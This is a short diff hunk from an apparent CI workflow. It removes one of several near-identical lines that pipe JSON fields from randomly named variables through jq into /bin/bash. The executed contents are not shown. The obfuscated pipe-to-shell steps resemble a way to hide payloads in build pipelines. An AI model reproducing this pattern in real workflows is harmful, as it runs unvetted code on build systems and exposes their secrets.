@@ -32,7 +32,6 @@ jobs:
           echo $vrg38 | jq -r .jcet1226 | /bin/bash
           printf '%s' "$j8776" | jq -r .iafwu7 | /bin/bash
           printf '%s' "$zm6" | jq -r .fjx7 | /bin/bash
-          printf '%s' "$sddg20" | jq -r .w08 | /bin/bash
 
       - name: Save output
         if: always()
